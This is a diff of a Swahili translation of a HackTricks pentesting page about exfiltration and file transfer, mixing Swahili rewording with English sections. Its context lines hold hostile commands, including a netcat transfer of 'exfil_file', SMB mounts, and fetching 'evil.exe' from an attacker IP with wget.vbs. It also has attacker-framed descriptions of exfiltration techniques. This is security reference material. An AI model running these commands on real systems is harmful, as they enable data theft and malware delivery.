@@ -8,15 +8,15 @@ Njia nyingine za kusaidia HackTricks:
 
 * Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-**Kikundi cha Usalama cha Kujaribu Kwa Bidii**
+**Kikundi cha Usalama cha Kujitahidi**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -185,25 +185,25 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-### Exfiltration Techniques on Windows
+# Windows
 
-#### Introduction
-When exfiltrating data from a Windows environment, there are several techniques that can be employed to achieve this goal. It is important to understand these methods in order to better protect against potential data breaches.
+## Exfiltration Techniques
 
-#### Common Exfiltration Techniques
-1. **Compression**: Compressing data before exfiltration can help reduce the size of the files being transferred, making it harder to detect.
-2. **Encryption**: Encrypting the exfiltrated data can help prevent unauthorized access to the information.
-3. **Steganography**: Hiding data within other files or images can be a covert way to exfiltrate information without detection.
-4. **DNS Tunneling**: Using DNS requests to tunnel data out of a network can bypass traditional security measures.
-5. **Exfiltration Over Alternative Protocols**: Utilizing protocols other than HTTP or HTTPS can help evade detection.
+### Exfiltration Over Command and Control Channel
 
-#### Tools and Resources
-- **PowerShell**: A powerful scripting language built into Windows that can be used for data exfiltration.
-- **Netcat**: A versatile networking utility that can be used for transferring data between systems.
-- **Covenant**: A .NET command and control framework that can be used for exfiltration purposes.
-- **Empire**: Another post-exploitation framework that can aid in data exfiltration.
+The attacker can exfiltrate data by sending commands to the compromised system to upload the desired files to an external server controlled by the attacker.
 
-By familiarizing yourself with these exfiltration techniques and tools, you can better prepare yourself to defend against potential data exfiltration attempts in a Windows environment.
+### Exfiltration Over Alternative Protocol
+
+The attacker can use alternative protocols such as DNS, ICMP, or HTTPS to exfiltrate data from the target network without being detected easily.
+
+### Exfiltration Over Encrypted Channels
+
+By using encryption techniques, the attacker can exfiltrate data over encrypted channels such as SSL/TLS to avoid detection by security monitoring tools.
+
+### Exfiltration Over Unmonitored Ports
+
+Attackers can exfiltrate data over ports that are not actively monitored by security tools, making it harder to detect the unauthorized data transfer.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -227,11 +227,20 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Swahili Translation
+### Data Exfiltration
 
-## NC
+Data exfiltration is the unauthorized transfer of data from a computer. This can be achieved using various techniques, such as:
 
-### Tafsiri ya Kiswahili
+- **Email**: Sending sensitive data as email attachments.
+- **FTP**: Transferring data using File Transfer Protocol.
+- **DNS**: Sending data through DNS queries.
+- **HTTP/HTTPS**: Using web protocols to exfiltrate data.
+- **Steganography**: Hiding data within other files to avoid detection.
+- **USB Drives**: Physically removing data using USB drives.
+- **Printers**: Printing out sensitive information.
+- **Cloud Storage**: Uploading data to cloud storage services.
+
+Hackers use these methods to steal data from organizations, making data exfiltration a significant concern for cybersecurity.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -272,7 +281,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP kupokea data hiyo kwa kutumia python:
+Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP ya kupokea data kwa kutumia python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -280,14 +289,14 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 Kwa chaguo-msingi katika XP na 2003 (katika nyingine inahitaji kuongezwa wazi wakati wa usakinishaji)
 
-Katika Kali, **anzisha seva ya TFTP**:
+Katika Kali, **anzisha server ya TFTP**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Server ya TFTP kwa kutumia python:**
+**Server ya TFTP kwa python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -342,13 +351,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Programu ya `debug.exe` sio tu inaruhusu ukaguzi wa binaries lakini pia ina **uwezo wa kujenga upya kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Walakini, ni muhimu kuzingatia kwamba debug.exe ina **kizuizi cha kuunda faili hadi 64 kb in size**.
+Programu ya `debug.exe` sio tu inaruhusu ukaguzi wa binaries lakini pia ina **uwezo wa kujenga upya kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Hata hivyo, ni muhimu kufahamu kwamba debug.exe ina **kizuizi cha kuunda faili zenye ukubwa wa hadi 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kisha nakili na ushirikishe maudhui kwenye windows-shell na faili iliyoitwa nc.exe itaundwa.
+Kisha nakili na ushirikishe maudhui kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -356,9 +365,9 @@ Kisha nakili na ushirikishe maudhui kwenye windows-shell na faili iliyoitwa nc.e
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Kikundi cha Usalama cha Kujaribu Kwa Bidii**
+**Kikundi cha Usalama cha Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -372,6 +381,6 @@ Njia nyingine za kusaidia HackTricks:
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
